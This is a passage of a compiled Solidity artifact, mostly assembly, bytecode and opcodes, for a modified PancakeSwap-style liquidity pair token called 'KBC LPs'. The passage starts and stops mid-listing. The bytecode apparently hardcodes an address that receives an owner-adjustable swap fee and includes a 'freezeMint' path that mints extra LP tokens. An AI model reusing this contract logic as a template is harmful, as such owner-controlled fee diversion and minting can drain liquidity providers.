_frozenBalance */\n      0x03\n        /* \"ERC20.sol\":2075:2098  _frozenBalance[account] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"ERC20.sol\":2075:2110  _frozenBalance[account].add(amount) */\n      tag_401\n      swap1\n        /* \"ERC20.sol\":2103:2109  amount */\n      dup4\n        /* \"ERC20.sol\":2075:2110  _frozenBalance[account].add(amount) */\n      0xffffffff\n        /* \"ERC20.sol\":2075:2102  _frozenBalance[account].add */\n      tag_358\n        /* \"ERC20.sol\":2075:2110  _frozenBalance[account].add(amount) */\n      and\n      jump\t// in\n    tag_401:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2049:2072  _frozenBalance[account] */\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"ERC20.sol\":2049:2063  _frozenBalance */\n      0x03\n        /* \"ERC20.sol\":2049:2072  _frozenBalance[account] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":2049:2110  _frozenBalance[account] = _frozenBalance[account].add(amount) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"ERC20.sol\":2125:2162  Transfer(address(0), account, amount) */\n      dup4\n      mload\n      dup7\n      dup2\n      mstore\n      swap4\n      mload\n        /* \"ERC20.sol\":2049:2072  _frozenBalance[account] */\n      swap3\n      swap4\n      swap2\n      swap3\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n        /* \"ERC20.sol\":2125:2162  Transfer(address(0), account, amount) */\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n      pop\n        /* \"ERC20.sol\":2179:2183  true */\n      0x01\n        /* \"ERC20.sol\":1714:2190  function freezeMint(... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"UQ112x112.sol\":321:439  function encode(uint112 y) internal pure returns (uint224 z) {... */\n    tag_350:\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"UQ112x112.sol\":396:406  uint224(y) */\n      and\n      shl(0x70, 0x01)\n        /* \"UQ112x112.sol\":396:413  uint224(y) * Q112 */\n      mul\n      swap1\n        /* \"UQ112x112.sol\":321:439  function encode(uint112 y) internal pure returns (uint224 z) {... */\n      jump\t// out\n        /* \"UQ112x112.sol\":507:613  function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {... */\n    tag_351:\n        /* \"UQ112x112.sol\":567:576  uint224 z */\n      0x00\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"UQ112x112.sol\":596:606  uint224(y) */\n      dup3\n      and\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"UQ112x112.sol\":592:606  x / uint224(y) */\n      dup5\n      and\n        /* \"UQ112x112.sol\":596:606  uint224(y) */\n      dup2\n        /* \"UQ112x112.sol\":592:606  x / uint224(y) */\n      tag_404\n      jumpi\n      invalid\n    tag_404:\n      div\n      swap4\n        /* \"UQ112x112.sol\":507:613  function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {... */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"SafeMath.sol\":198:333  function add(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_358:\n        /* \"SafeMath.sol\":290:295  x + y */\n      dup1\n      dup3\n      add\n        /* \"SafeMath.sol\":285:301  (z = x + y) >= x */\n      dup3\n      dup2\n      lt\n      iszero\n        /* \"SafeMath.sol\":277:326  require((z = x + y) >= x, \"ds-math-add-overflow\") */\n      tag_188\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x14\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x60, 0x64732d6d6174682d6164642d6f766572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    stop\n    data_1b988f8784cc3cf7ad7d1bf59197df07b7925b5a748a478400a8f83fd9e196ef 4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f6e\n    data_50b0a6dd250a09c1cd083ad4bf9f97424665d60e7bc0a208a1151c7d0051999c 50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54\n    data_6591c9f5bf1fefaad109b76a20e25c857b696080c952191f86220f001a83663e 556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e544544\n    data_6c050b0a8d3f2d18d11271ee0a551b7748437b8fa9a6165c561190d34a2947d6 50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544\n    data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n    data_c654718515b5f98052eb92744d97d32cccabf6e8b2bae886738591c9b906cfd8 50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e54\n    data_ef633320352a650c1d75752f13e6c73d8d8f7f26a5596a6d026c1bf50d2f7713 50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544\n\n    auxdata: 0xa265627a7a72315820cf9089f787db5c2a6ca32ebe2dc67686be59ff857f8ac479e4a2edbca7aaf7c464736f6c63430005100032\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052600680546001600160a01b031916739e94ee69f3cdcd5e74e05563736e4679da6db44c179055600160105534801561003b57600080fd5b50604051469080605261290182396040805191829003605201822082820182526007808452664b4243204c507360c81b6020948501528251808401845260018152603160f81b908501528251808501929092527f6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe828401527fc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6606083015260808201959095523060a0808301919091528251808303909101815260c090910190915280519101206004555080546001600160a01b031990811633908117909255600f805490911690911790556127cb806101366000396000f3fe608060405234801561001057600080fd5b50600436106101fb5760003560e01c806370a082311161011a578063ba9a7a56116100ad578063d505accf1161007c578063d505accf146105e9578063dcbbb3731461063a578063dd62ed3e14610660578063f317739c1461068e578063fff6cae914610696576101fb565b8063ba9a7a56146105ab578063bc25cf77146105b3578063c45a0155146105d9578063d21220a7146105e1576101fb565b80638da5cb5b116100e95780638da5cb5b14610567578063900820d81461056f57806395d89b4114610577578063a9059cbb1461057f576101fb565b806370a08231146104d45780637464fc3d146104fa5780637ecebe001461050257806389afcb4414610528576101fb565b806330adf81f116101925780635909c0d5116101615780635909c0d5146104815780635a3d5493146104895780636488f7b0146104915780636a627842146104ae576101fb565b806330adf81f1461042d578063313ce567146104355780633644e5151461045357806347d5d8561461045b576101fb565b80630dfe1681116101ce5780630dfe1681146103835780631794bb3c146103a757806318160ddd146103dd57806323b872dd146103f7576101fb565b8063022c0d9f1461020057806306fdde031461028e5780630902f1ac1461030b578063095ea7b314610343575b600080fd5b61028c6004803603608081101561021657600080fd5b8135916020810135916001600160a01b03604083013516919081019060808101606082013564010000000081111561024d57600080fd5b82018360208201111561025f57600080fd5b8035906020019184600183028401116401000000008311171561028157600080fd5b50909250905061069e565b005b610296610c7a565b6040805160208082528351818301528351919283929083019185019080838360005b838110156102d05781810151838201526020016102b8565b50505050905090810190601f1680156102fd5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b610313610c9d565b604080516001600160701b03948516815292909316602083015263ffffffff168183015290519081900360600190f35b61036f6004803603604081101561035957600080fd5b506001600160a01b038135169060200135610cc7565b604080519115158252519081900360200190f35b61038b610cde565b604080516001600160a01b039092168252519081900360200190f35b61028c600480360360608110156103bd57600080fd5b506001600160a01b03813581169160208101359091169060400135610ced565b6103e5610d76565b60408051918252519081900360200190f35b61036f6004803603606081101561040d57600080fd5b506001600160a01b03813581169160208101359091169060400135610d7c565b6103e5610e16565b61043d610e3a565b6040805160ff9092168252519081900360200190f35b6103e5610e3f565b6103e56004803603602081101561047157600080fd5b50356001600160a01b0316610e45565b6103e5610e57565b6103e5610e5d565b61028c600480360360208110156104a757600080fd5b5035610e63565b6103e5600480360360208110156104c457600080fd5b50356001600160a01b0316610eb1565b6103e5600480360360208110156104ea57600080fd5b50356001600160a01b03166111af565b6103e56111c1565b6103e56004803603602081101561051857600080fd5b50356001600160a01b03166111c7565b61054e6004803603602081101561053e57600080fd5b50356001600160a01b03166111d9565b6040805192835260208301919091528051918290030190f35b61038b61157d565b61038b61158c565b61029661159b565b61036f6004803603604081101561059557600080fd5b506001600160a01b0381351690602001356115bd565b6103e56115ca565b61028c600480360360208110156105c957600080fd5b50356001600160a01b03166115d0565b61038b611739565b61038b611748565b61028c600480360360e08110156105ff57600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c00135611757565b6103e56004803603602081101561065057600080fd5b50356001600160a01b0316611957565b6103e56004803603604081101561067657600080fd5b506001600160a01b0381358116916020013516611ba6565b6103e5611bc3565b61028c611bc9565b6010546001146106e7576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000601055841515806106fa5750600084115b6107355760405162461bcd60e51b815260040180806020018281038252602381526020018061274e6023913960400191505060405180910390fd5b600080610740610c9d565b5091509150816001600160701b0316871080156107655750806001600160701b031686105b6107b6576040805162461bcd60e51b815260206004820152601f60248201527f50616e63616b653a20494e53554646494349454e545f4c495155494449545900604482015290519081900360640190fd5b60008060006064600a548b02816107c957fe5b048a03905060006064600a548b02816107de57fe5b600854600954929091048c0392506001600160a01b03908116918116908b16821480159061081e5750806001600160a01b03168b6001600160a01b031614155b610865576040805162461bcd60e51b815260206004820152601360248201527250616e63616b653a20494e56414c49445f544f60681b604482015290519081900360640190fd5b8c1561087657610876828c86611d29565b8b1561088757610887818c85611d29565b8815610942578a6001600160a01b031663848008123386868e8e6040518663ffffffff1660e01b815260040180866001600160a01b03166001600160a01b03168152602001858152602001848152602001806020018281038252848482818152602001925080828437600081840152601f19601f8201169050808301925050509650505050505050600060405180830381600087803b15801561092957600080fd5b505af115801561093d573d6000803e3d6000fd5b505050505b60006064600a548f028161095257fe5b04905060006064600a548f028161096557fe5b0490508e15610986576006546109869085906001600160a01b031684611d29565b8d156109a4576006546109a49084906001600160a01b031683611d29565b604080516370a0823160e01b815230600482015290516001600160a01b038616916370a08231916024808301926020929190829003018186803b1580156109ea57600080fd5b505afa1580156109fe573d6000803e3d6000fd5b505050506040513d6020811015610a1457600080fd5b5051604080516370a0823160e01b815230600482015290519199506001600160a01b038516916370a0823191602480820192602092909190829003018186803b158015610a6057600080fd5b505afa158015610a74573d6000803e3d6000fd5b505050506040513d6020811015610a8a57600080fd5b505196506000955050505050506001600160701b0385168a90038311610ab1576000610ac0565b89856001600160701b03160383035b9050600089856001600160701b0316038311610add576000610aec565b89856001600160701b03160383035b90506000821180610afd5750600081115b610b385760405162461bcd60e51b81526004018080602001828103825260228152602001806126be6022913960400191505060405180910390fd5b6000610b6c610b4e84601963ffffffff611ec316565b610b608761271063ffffffff611ec316565b9063ffffffff611f2616565b90506000610b84610b4e84601963ffffffff611ec316565b9050610bb66305f5e100610baa6001600160701b038b8116908b1663ffffffff611ec316565b9063ffffffff611ec316565b610bc6838363ffffffff611ec316565b1015610c06576040805162461bcd60e51b815260206004820152600a60248201526950616e63616b653a204b60b01b604482015290519081900360640190fd5b5050610c1484848888611f76565b60408051838152602081018390528082018d9052606081018c905290516001600160a01b038b169133917fd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d8229181900360800190a350506001601055505050505050505050565b604051806040016040528060078152602001664b4243204c507360c81b81525081565b600b546001600160701b0380821692600160701b830490911691600160e01b900463ffffffff1690565b6000610cd4338484612139565b5060015b92915050565b6008546001600160a01b031681565b6007546001600160a01b03163314610d41576040805162461bcd60e51b81526020600482015260126024820152712830b731b0b5b29d102327a92124a22222a760711b604482015290519081900360640190fd5b600880546001600160a01b039485166001600160a01b0319918216179091556009805493909416921691909117909155600a55565b60005481565b6001600160a01b038316600090815260026020908152604080832033845290915281205460001914610e01576001600160a01b0384166000908152600260209081526040808320338452909152902054610ddc908363ffffffff611f2616565b6001600160a01b03851660009081526002602090815260408083203384529091529020555b610e0c84848461219b565b5060019392505050565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b601281565b60045481565b60036020526000908152604090205481565b600c5481565b600d5481565b600f546001600160a01b03163314610eac5760405162461bcd60e51b815260040180806020018281038252602181526020018061269d6021913960400191505060405180910390fd5b600a55565b6000601054600114610efc576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000601081905580610f0c610c9d565b50600854604080516370a0823160e01b815230600482015290519395509193506000926001600160a01b03909116916370a08231916024808301926020929190829003018186803b158015610f6057600080fd5b505afa158015610f74573d6000803e3d6000fd5b505050506040513d6020811015610f8a57600080fd5b5051600954604080516370a0823160e01b815230600482015290519293506000926001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015610fdd57600080fd5b505afa158015610ff1573d6000803e3d6000fd5b505050506040513d602081101561100757600080fd5b505190506000611026836001600160701b03871663ffffffff611f2616565b90506000611043836001600160701b03871663ffffffff611f2616565b905060006110518787612243565b6000549091508061108e5761107a6103e8610b60611075878763ffffffff611ec316565b6123b6565b985061108960006103e8612408565b6110dd565b6110da6001600160701b0389166110ab868463ffffffff611ec316565b816110b257fe5b046001600160701b0389166110cd868563ffffffff611ec316565b816110d457fe5b0461248c565b98505b6000891161111c5760405162461bcd60e51b81526004018080602001828103825260268152602001806127716026913960400191505060405180910390fd5b6111268a8a612408565b61113286868a8a611f76565b811561116257600b5461115e906001600160701b0380821691600160701b90041663ffffffff611ec316565b600e555b6040805185815260208101859052815133927f4c209b5fc8ad50758f13e2e1088ba56a560dff690a1c6fef26394f4c03821c4f928290030190a25050600160105550949695505050505050565b60016020526000908152604090205481565b600e5481565b60056020526000908152604090205481565b600080601054600114611225576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000601081905580611235610c9d565b50600854600954604080516370a0823160e01b815230600482015290519496509294506001600160a01b039182169391169160009184916370a08231916024808301926020929190829003018186803b15801561129157600080fd5b505afa1580156112a5573d6000803e3d6000fd5b505050506040513d60208110156112bb57600080fd5b5051604080516370a0823160e01b815230600482015290519192506000916001600160a01b038516916370a08231916024808301926020929190829003018186803b15801561130957600080fd5b505afa15801561131d573d6000803e3d6000fd5b505050506040513d602081101561133357600080fd5b5051306000908152600160205260408120549192506113528888612243565b60005490915080611369848763ffffffff611ec316565b8161137057fe5b049a5080611384848663ffffffff611ec316565b8161138b57fe5b04995060008b11801561139e575060008a115b6113d95760405162461bcd60e51b81526004018080602001828103825260268152602001806127086026913960400191505060405180910390fd5b6113e330846124a4565b6113ee878d8d611d29565b6113f9868d8c611d29565b604080516370a0823160e01b815230600482015290516001600160a01b038916916370a08231916024808301926020929190829003018186803b15801561143f57600080fd5b505afa158015611453573d6000803e3d6000fd5b505050506040513d602081101561146957600080fd5b5051604080516370a0823160e01b815230600482015290519196506001600160a01b038816916370a0823191602480820192602092909190829003018186803b1580156114b557600080fd5b505afa1580156114c9573d6000803e3d6000fd5b505050506040513d60208110156114df57600080fd5b505193506114ef85858b8b611f76565b811561151f57600b5461151b906001600160701b0380821691600160701b90041663ffffffff611ec316565b600e555b604080518c8152602081018c905281516001600160a01b038f169233927fdccd412f0b1252819cb1fd330b93224ca42612892bb3f4f789976e6d81936496929081900390910190a35050505050505050506001601081905550915091565b600f546001600160a01b031681565b6006546001600160a01b031681565b6040518060400160405280600681526020016504b42432d4c560d41b81525081565b6000610cd433848461219b565b6103e881565b601054600114611619576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000601055600854600954600b54604080516370a0823160e01b815230600482015290516001600160a01b0394851694909316926116c892859287926116c3926001600160701b03169185916370a0823191602480820192602092909190829003018186803b15801561168b57600080fd5b505afa15801561169f573d6000803e3d6000fd5b505050506040513d60208110156116b557600080fd5b50519063ffffffff611f2616565b611d29565b600b54604080516370a0823160e01b8152306004820152905161172f92849287926116c392600160701b90046001600160701b0316916001600160a01b038616916370a0823191602480820192602092909190829003018186803b15801561168b57600080fd5b5050600160105550565b6007546001600160a01b031681565b6009546001600160a01b031681565b4284101561179f576040805162461bcd60e51b815260206004820152601060248201526f14185b98d85ad94e881156141254915160821b604482015290519081900360640190fd5b6004546001600160a01b0380891660008181526005602090815260408083208054600180820190925582517f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c98186015280840196909652958d166060860152608085018c905260a085019590955260c08085018b90528151808603909101815260e08501825280519083012061190160f01b6101008601526101028501969096526101228085019690965280518085039096018652610142840180825286519683019690962095839052610162840180825286905260ff89166101828501526101a284018890526101c28401879052519193926101e280820193601f1981019281900390910190855afa1580156118ba573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116158015906118f05750886001600160a01b0316816001600160a01b0316145b611941576040805162461bcd60e51b815260206004820152601a60248201527f50616e63616b653a20494e56414c49445f5349474e4154555245000000000000604482015290519081900360640190fd5b61194c898989612139565b505050505050505050565b60006010546001146119a2576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b60006010819055806119b2610c9d565b50600854604080516370a0823160e01b815230600482015290519395509193506000926001600160a01b03909116916370a08231916024808301926020929190829003018186803b158015611a0657600080fd5b505afa158015611a1a573d6000803e3d6000fd5b505050506040513d6020811015611a3057600080fd5b5051600954604080516370a0823160e01b815230600482015290519293506000926001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015611a8357600080fd5b505afa158015611a97573d6000803e3d6000fd5b505050506040513d6020811015611aad57600080fd5b505190506000611acc836001600160701b03871663ffffffff611f2616565b90506000611ae9836001600160701b03871663ffffffff611f2616565b90506000611af78787612243565b60005490915080611b3057611b1b6103e8610b60611075878763ffffffff611ec316565b9850611b2a60006103e8612530565b50611b50565b611b4d6001600160701b0389166110ab868463ffffffff611ec316565b98505b60008911611b8f5760405162461bcd60e51b81526004018080602001828103825260288152602001806126e06028913960400191505060405180910390fd5b611b998a8a612530565b5061113286868a8a611f76565b600260209081526000928352604080842090915290825290205481565b600a5481565b601054600114611c12576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000601055600854604080516370a0823160e01b81523060048201529051611d22926001600160a01b0316916370a08231916024808301926020929190829003018186803b158015611c6357600080fd5b505afa158015611c77573d6000803e3d6000fd5b505050506040513d6020811015611c8d57600080fd5b5051600954604080516370a0823160e01b815230600482015290516001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015611cda57600080fd5b505afa158015611cee573d6000803e3d6000fd5b505050506040513d6020811015611d0457600080fd5b5051600b546001600160701b0380821691600160701b900416611f76565b6001601055565b604080518082018252601981527f7472616e7366657228616464726573732c75696e74323536290000000000000060209182015281516001600160a01b0385811660248301526044808301869052845180840390910181526064909201845291810180516001600160e01b031663a9059cbb60e01b1781529251815160009460609489169392918291908083835b60208310611dd65780518252601f199092019160209182019101611db7565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114611e38576040519150601f19603f3d011682016040523d82523d6000602084013e611e3d565b606091505b5091509150818015611e6b575080511580611e6b5750808060200190516020811015611e6857600080fd5b50515b611ebc576040805162461bcd60e51b815260206004820152601860248201527f50616e63616b653a205452414e534645525f4641494c45440000000000000000604482015290519081900360640190fd5b5050505050565b6000811580611ede57505080820282828281611edb57fe5b04145b610cd8576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6d756c2d6f766572666c6f7760601b604482015290519081900360640190fd5b80820382811115610cd8576040805162461bcd60e51b815260206004820152601560248201527464732d6d6174682d7375622d756e646572666c6f7760581b604482015290519081900360640190fd5b6001600160701b038411801590611f9457506001600160701b038311155b611fd9576040805162461bcd60e51b815260206004820152601160248201527050616e63616b653a204f564552464c4f5760781b604482015290519081900360640190fd5b600b5463ffffffff42811691600160e01b9004811682039081161580159061200957506001600160701b03841615155b801561201d57506001600160701b03831615155b1561208e578063ffffffff1661204b8561203686612616565b6001600160e01b03169063ffffffff61262816565b600c80546001600160e01b03929092169290920201905563ffffffff81166120768461203687612616565b600d80546001600160e01b0392909216929092020190555b600b80546dffffffffffffffffffffffffffff19166001600160701b03888116919091176dffffffffffffffffffffffffffff60701b1916600160701b8883168102919091176001600160e01b0316600160e01b63ffffffff871602179283905560408051848416815291909304909116602082015281517f1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1929181900390910190a1505050505050565b6001600160a01b03808416600081815260026020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b6001600160a01b0383166000908152600160205260409020546121c4908263ffffffff611f2616565b6001600160a01b0380851660009081526001602052604080822093909355908416815220546121f9908263ffffffff61264d16565b6001600160a01b03808416600081815260016020908152604091829020949094558051858152905191939287169260008051602061272e83398151915292918290030190a3505050565b600080600760009054906101000a90046001600160a01b03166001600160a01b031663017e7e586040518163ffffffff1660e01b815260040160206040518083038186803b15801561229457600080fd5b505afa1580156122a8573d6000803e3d6000fd5b505050506040513d60208110156122be57600080fd5b5051600e546001600160a01b0382161580159450919250906123a257801561239d5760006123016110756001600160701b0388811690881663ffffffff611ec316565b9050600061230e836123b6565b90508082111561239a5760006123416008610baa612332868663ffffffff611f2616565b6000549063ffffffff611ec316565b9050600061237661235984600863ffffffff611ec316565b61236a86601163ffffffff611ec316565b9063ffffffff61264d16565b9050600081838161238357fe5b0490508015612396576123968782612408565b5050505b50505b6123ae565b80156123ae576000600e555b505092915050565b600060038211156123f9575080600160028204015b818110156123f3578091506002818285816123e257fe5b0401816123eb57fe5b0490506123cb565b50612403565b8115612403575060015b919050565b60005461241b908263ffffffff61264d16565b60009081556001600160a01b038316815260016020526040902054612446908263ffffffff61264d16565b6001600160a01b038316600081815260016020908152604080832094909455835185815293519293919260008051602061272e8339815191529281900390910190a35050565b600081831061249b578161249d565b825b9392505050565b6001600160a01b0382166000908152600160205260409020546124cd908263ffffffff611f2616565b6001600160a01b038316600090815260016020526040812091909155546124fa908263ffffffff611f2616565b60009081556040805183815290516001600160a01b0385169160008051602061272e833981519152919081900360200190a35050565b60006001600160a01b03831661258d576040805162461bcd60e51b815260206004820152601f60248201527f42455032303a206d696e7420746f20746865207a65726f206164647265737300604482015290519081900360640190fd5b6000546125a0908363ffffffff61264d16565b60009081556001600160a01b0384168152600360205260409020546125cb908363ffffffff61264d16565b6001600160a01b038416600081815260036020908152604080832094909455835186815293519293919260008051602061272e8339815191529281900390910190a350600192915050565b6001600160701b0316600160701b0290565b60006001600160701b0382166001600160e01b0384168161264557fe5b049392505050565b80820182811015610cd8576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6164642d6f766572666c6f7760601b604482015290519081900360640190fdfe4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f6e50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e54454450616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e5450616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544a265627a7a72315820cf9089f787db5c2a6ca32ebe2dc67686be59ff857f8ac479e4a2edbca7aaf7c464736f6c63430005100032454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x6 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH20 0x9E94EE69F3CDCD5E74E05563736E4679DA6DB44C OR SWAP1 SSTORE PUSH1 0x1 PUSH1 0x10 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x3B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD CHAINID SWAP1 DUP1 PUSH1 0x52 PUSH2 0x2901 DUP3 CODECOPY PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB PUSH1 0x52 ADD DUP3 KECCAK256 DUP3 DUP3 ADD DUP3 MSTORE PUSH1 0x7 DUP1 DUP5 MSTORE PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL PUSH1 0x20 SWAP5 DUP6 ADD MSTORE DUP3 MLOAD DUP1 DUP5 ADD DUP5 MSTORE PUSH1 0x1 DUP2 MSTORE PUSH1 0x31 PUSH1 0xF8 SHL SWAP1 DUP6 ADD MSTORE DUP3 MLOAD DUP1 DUP6 ADD SWAP3 SWAP1 SWAP3 MSTORE PUSH32 0x6A36D39F32C2225411D16C8F56813B9117E6EB8BF3D2893C5FC62411565CFCFE DUP3 DUP5 ADD MSTORE PUSH32 0xC89EFDAA54C0F20C7ADF612882DF0950F5A951637E0307CDCB4C672F298B8BC6 PUSH1 0x60 DUP4 ADD MSTORE PUSH1 0x80 DUP3 ADD SWAP6 SWAP1 SWAP6 MSTORE ADDRESS PUSH1 0xA0 DUP1 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP3 MLOAD DUP1 DUP4 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xC0 SWAP1 SWAP2 ADD SWAP1 SWAP2 MSTORE DUP1 MLOAD SWAP2 ADD KECCAK256 PUSH1 0x4 SSTORE POP DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT SWAP1 DUP2 AND CALLER SWAP1 DUP2 OR SWAP1 SWAP3 SSTORE PUSH1 0xF DUP1 SLOAD SWAP1 SWAP2 AND SWAP1 SWAP2 OR SWAP1 SSTORE PUSH2 0x27CB DUP1 PUSH2 0x136 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x1FB JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x70A08231 GT PUSH2 0x11A JUMPI DUP1 PUSH4 0xBA9A7A56 GT PUSH2 0xAD JUMPI DUP1 PUSH4 0xD505ACCF GT PUSH2 0x7C JUMPI DUP1 PUSH4 0xD505ACCF EQ PUSH2 0x5E9 JUMPI DUP1 PUSH4 0xDCBBB373 EQ PUSH2 0x63A JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x660 JUMPI DUP1 PUSH4 0xF317739C EQ PUSH2 0x68E JUMPI DUP1 PUSH4 0xFFF6CAE9 EQ PUSH2 0x696 JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0xBA9A7A56 EQ PUSH2 0x5AB JUMPI DUP1 PUSH4 0xBC25CF77 EQ PUSH2 0x5B3 JUMPI DUP1 PUSH4 0xC45A0155 EQ PUSH2 0x5D9 JUMPI DUP1 PUSH4 0xD21220A7 EQ PUSH2 0x5E1 JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0x8DA5CB5B GT PUSH2 0xE9 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x567 JUMPI DUP1 PUSH4 0x900820D8 EQ PUSH2 0x56F JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x577 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x57F JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0x70A08231 EQ PUSH2 0x4D4 JUMPI DUP1 PUSH4 0x7464FC3D EQ PUSH2 0x4FA JUMPI DUP1 PUSH4 0x7ECEBE00 EQ PUSH2 0x502 JUMPI DUP1 PUSH4 0x89AFCB44 EQ PUSH2 0x528 JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0x30ADF81F GT PUSH2 0x192 JUMPI DUP1 PUSH4 0x5909C0D5 GT PUSH2 0x161 JUMPI DUP1 PUSH4 0x5909C0D5 EQ PUSH2 0x481 JUMPI DUP1 PUSH4 0x5A3D5493 EQ PUSH2 0x489 JUMPI DUP1 PUSH4 0x6488F7B0 EQ PUSH2 0x491 JUMPI DUP1 PUSH4 0x6A627842 EQ PUSH2 0x4AE JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0x30ADF81F EQ PUSH2 0x42D JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x435 JUMPI DUP1 PUSH4 0x3644E515 EQ PUSH2 0x453 JUMPI DUP1 PUSH4 0x47D5D856 EQ PUSH2 0x45B JUMPI PUSH2 0x1FB JUMP JUMPDEST DUP1 PUSH4 0xDFE1681 GT PUSH2 0x1CE JUMPI DUP1 PUSH4 0xDFE1681 EQ PUSH2 0x383 JUMPI DUP1 PUSH4 0x1794BB3C EQ PUSH2 0x3A7 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x3DD JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x3F7 JUMPI PUSH2 0x1FB JUMP 